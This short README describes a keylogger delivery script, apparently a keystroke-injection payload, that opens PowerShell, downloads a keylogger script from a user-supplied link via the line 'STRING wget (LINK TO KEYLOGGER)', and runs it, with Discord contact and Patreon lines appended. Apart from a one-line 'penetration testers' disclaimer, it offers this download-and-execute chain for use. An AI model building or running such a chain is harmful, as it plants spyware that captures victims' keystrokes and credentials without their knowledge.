
# Keylogger
This script is only for experienced penetration testers.

## How to use?

This script is not plug and play. You need to do the following changes:

- change url to a .ps keylogger script "STRING wget (LINK TO KEYLOGGER)"


## Features

- open powershell 
- download .ps script
- execute script



## Feedback

If you have any feedback, please reach out to me via Discord "UNC0V3R3D#8662".






## Support

For support, contact me via  Discord "UNC0V3R3D#8662".


## Meta


- If you want to sponsor me on Patreon, the link is on my profile.


